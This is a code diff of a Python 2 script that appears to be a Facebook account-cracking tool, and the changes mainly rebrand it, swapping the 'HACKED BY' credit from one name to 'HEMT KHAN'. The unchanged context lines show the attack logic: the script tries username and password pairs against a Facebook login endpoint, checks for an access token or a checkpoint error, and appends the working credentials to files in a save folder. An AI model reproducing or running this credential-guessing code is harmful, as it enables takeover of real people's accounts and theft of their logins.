@@ -54,7 +54,7 @@ logo = """
 
 
 
-
+HEMT KHAN JALALZAI 
  
  
 
@@ -131,12 +131,12 @@ def Ali():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  no ' + pass1 + '\n' + '\n'
-                okb = open('save/ HACKED BY Ali Cybery  .txt', 'a')
+                okb = open('save/ HACKED BY HEMT KHAN  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY Ali Cybery \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
+                print '\x1b[1;92mHACKED BY HEMT KHAN \x1b[1;92m ' + k + c + user + '  yes  ' + pass1 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '   ' + pass1 + '\n')
                 cps.close()
@@ -147,12 +147,12 @@ def Ali():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[CHECKPOINT]\x1b[1;91m ' + k + c + user + '  NO  ' + pass1 + '\n' + '\n'
-                okb = open('save/ HACKED BY HEMTKHAN  .txt', 'a')
+                okb = open('save/ HACKED BY HEMT KHAN  .txt', 'a')
                 okb.write(k + c + user + '   ' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;92mHACKED BY HEMTKHAN \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
+                print '\x1b[1;92mHACKED BY HEMT KHAN \x1b[1;92m ' + k + c + user + '  yes  ' + pass2 + '\n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '    ' + pass2 + '\n')
                 cps.close()
